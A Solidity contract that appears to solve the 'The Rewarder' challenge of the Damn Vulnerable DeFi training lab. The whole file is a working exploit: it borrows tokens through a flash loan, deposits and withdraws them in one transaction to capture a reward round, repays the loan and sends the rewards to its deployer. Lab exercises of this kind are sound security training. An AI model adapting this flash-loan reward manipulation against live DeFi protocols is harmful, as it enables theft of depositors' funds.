// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../DamnValuableToken.sol";

contract TheRewarderAttack {
    FlashLoanerPool immutable loanPool;
    TheRewarderPool immutable rewardPool;
    DamnValuableToken immutable liqToken;
    address payable immutable owner;

    constructor(address _loanPool, address _rewardPool, address _liqToken) {
        loanPool = FlashLoanerPool(_loanPool);
        rewardPool = TheRewarderPool(_rewardPool);
        liqToken = DamnValuableToken(_liqToken);
        owner = payable(msg.sender);
    }

    function attack(uint256 amount) external {
        loanPool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        liqToken.approve(address(rewardPool), amount);

        rewardPool.deposit(amount);
        rewardPool.withdraw(amount);

        liqToken.transfer(address(loanPool), amount);

        uint256 balance = rewardPool.rewardToken().balanceOf(address(this));
        rewardPool.rewardToken().transfer(owner, balance);
    }
}
